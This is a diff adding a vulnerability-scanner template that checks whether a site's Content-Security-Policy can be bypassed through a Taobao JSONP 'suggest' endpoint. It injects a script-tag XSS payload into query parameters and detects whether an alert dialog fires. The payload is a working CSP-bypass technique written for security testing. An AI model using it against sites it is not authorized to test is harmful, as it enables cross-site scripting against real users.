@@ -1,0 +1,55 @@
+id: taobao-suggest-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Taobao Suggest
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,taobao-suggest,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "taobao.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: taobao_suggest_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://suggest.taobao.com/sug?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "taobao_suggest_csp_xss == true"
+# digest: 4b0a00483046022100bb28bd9183776bbbc499fd570c46f5a196b8c21d58b23825c79c9c43e90498a4022100f0030f60870194ac9324a190b641a97a7f81d127f59bddaf050ea218332a79d8:922c64590222798bb761d5b6d8e72950
